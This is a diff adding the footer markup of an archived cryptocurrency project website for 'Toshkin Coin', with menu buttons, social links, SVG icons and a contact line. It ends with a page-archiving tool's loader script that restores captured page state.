+                                    </pattern>
+                                    <image xlink:href="f615dd994331eed0fa38c5947d32a80c1968527c.png" id="b" width="225"
+                                        height="225"></image>
+                                </defs>
+                            </svg></div>
+                        <nav class="-footer__top-menu">
+                            <ul class="-footer__menu"><!--[-->
+                                <li class="-footer__menu-item"><button class="-footer__button">About Toshkin</button>
+                                </li>
+                                <li class="-footer__menu-item"><button class="-footer__button">Team</button></li>
+                                <li class="-footer__menu-item"><button class="-footer__button">NFT and Binance</button>
+                                </li>
+                                <li class="-footer__menu-item"><button class="-footer__button">Toshkinomics</button>
+                                </li>
+                                <li class="-footer__menu-item"><button class="-footer__button">Our Partners</button>
+                                </li>
+                                <li class="-footer__menu-item"><button class="-footer__button">All Markets</button></li>
+                                <li class="-footer__menu-item"><button class="-footer__button">Roadmap</button></li>
+                                <li class="-footer__menu-item"><button class="-footer__button">Useful Links</button>
+                                </li><!--]-->
+                            </ul>
+                        </nav>
+                        <div class="-socials -footer__top-socials"><!--[--><a href="https://x.com/toshkincoin" title="X"
+                                class="-socials__icons -socials__x" target="_blank" rel="nofollow"><svg
+                                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 76 56">
+                                    <path
+                                        d="m15.32 6.907 17.599 23.268-17.711 18.918h3.986L34.7 32.53l12.527 16.563h13.565l-18.59-24.577 16.485-17.61h-3.986l-14.28 15.255L28.883 6.907zm5.86 2.903h6.232L54.93 46.19h-6.231z">
+                                    </path>
+                                </svg></a><a href="https://t.me/toshkincoin" title="Telegram"
+                                class="-socials__icons -socials__telegram" target="_blank" rel="nofollow"><svg
+                                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 60">
+                                    <path
+                                        d="m24.45 46.625.7-10.575 19.2-17.3c.85-.775-.175-1.15-1.3-.475L19.35 33.25 9.1 30c-2.2-.625-2.225-2.15.5-3.25l39.925-15.4c1.825-.825 3.575.45 2.875 3.25l-6.8 32.025c-.475 2.275-1.85 2.825-3.75 1.775L31.5 40.75l-4.975 4.825c-.575.575-1.05 1.05-2.075 1.05">
+                                    </path>
+                                </svg></a><a href="https://x.com/toshkincoin" title="Tiktok"
+                                class="-socials__icons -socials__tiktok" target="_blank" rel="nofollow"><svg
+                                    xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                                    <path
+                                        d="M18.393 48.05c-4.189-.756-8.15-3.667-9.91-7.281-1.221-2.51-1.69-5.163-1.389-7.851.56-4.982 3.138-9.061 7.147-11.306 2.113-1.183 5.14-1.771 7.395-1.436l1.303.193v7.967l-1.232-.052c-2.972-.123-5.185 1.15-6.329 3.634-.547 1.188-.685 3.3-.3 4.587.474 1.588 1.877 3.02 3.57 3.65.578.215 1.202.297 2.272.293 1.332-.001 1.576-.048 2.513-.491 1.356-.641 2.345-1.572 2.927-2.753.377-.765.498-1.274.616-2.582.08-.896.149-8.216.152-16.268l.003-14.64h2.54c1.397 0 3.074.044 3.728.1l1.188.1v.589c0 1.416.829 4.133 1.677 5.501.213.342.953 1.18 1.647 1.864 1.34 1.32 2.47 1.988 4.21 2.486.512.148 1.053.33 1.201.405.149.074.428.14.622.14.193.002.509.045.701.097l.35.093v7.39l-.66-.07c-3.57-.386-6.424-1.338-8.7-2.905-1.132-.779-1.23-.825-1.123-.528.039.108.011 4.178-.061 9.048-.125 8.442-.147 8.911-.475 10.093-1.259 4.54-4.085 7.91-7.806 9.31-2.276.857-5.187 1.092-7.777.624">
+                                    </path>
+                                </svg></a><!--]--></div>
+                    </div>
+                    <div class="-footer__bottom">
+                        <p>Contact us:&nbsp;&nbsp;&nbsp;<a href="mailto:info@toshkin.com"
+                                class="-footer__contact-us">info@toshkin.com</a></p>
+                        <p>© 2024 TOSHKIN COIN, ALL RIGHTS RESERVED.</p>
+                    </div>
+                </div>
+            </div>
+        </div><!--]-->
+    </div>
+    <div id="teleports"></div>
+    <script
+        data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({ mode: 'open' }); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script>
+</body>
+
+</html>
